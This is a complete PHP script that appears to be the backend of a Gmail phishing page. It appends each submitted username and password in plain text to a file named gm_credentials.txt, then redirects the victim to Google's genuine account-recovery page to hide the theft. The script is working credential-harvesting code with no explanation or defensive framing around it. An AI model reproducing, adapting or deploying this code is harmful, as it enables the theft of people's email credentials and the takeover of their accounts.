<?php

file_put_contents("gm_credentials.txt", "Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
